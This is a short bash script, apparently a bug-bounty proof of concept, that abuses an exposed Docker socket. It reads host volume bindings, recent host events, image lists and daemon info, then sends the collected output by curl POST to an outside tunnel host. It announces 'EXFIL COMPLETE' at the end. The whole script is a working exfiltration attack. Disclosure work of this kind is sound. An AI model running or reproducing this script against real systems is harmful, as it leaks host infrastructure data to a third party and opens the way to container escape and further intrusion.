#!/bin/bash
URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"

{
  echo "=== [!] GOOGLE VRP: VOLUME DISCLOSURE PoC ==="
  
  # 1. Show the Volume actually exists and points to /
  echo "--- [1] PROVING HOST-ROOT BIND ---"
  curl -s --unix-socket /var/run/docker.sock http://localhost/volumes/p0_root
  
  # 2. Extract Docker Events
  # This leaks what the host is doing in the background!
  echo -e "\n--- [2] LEAKING SYSTEM EVENTS (HOST ACTIVITY) ---"
  curl -s --unix-socket /var/run/docker.sock "http://localhost/events?until=$(date +%s)" | head -n 20
  
  # 3. List all Host Images (Metadata Leak)
  echo -e "\n--- [3] LEAKING INFRASTRUCTURE IMAGES ---"
  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
  
  # 4. Final Verification: Can we read Docker's internal config?
  echo -e "\n--- [4] DOCKER SYSTEM CONFIG ---"
  curl -s --unix-socket /var/run/docker.sock http://localhost/info

  echo -e "\n=== [!] EXFIL COMPLETE ==="
} | curl -s -X POST --data-binary @- "https://$URL"
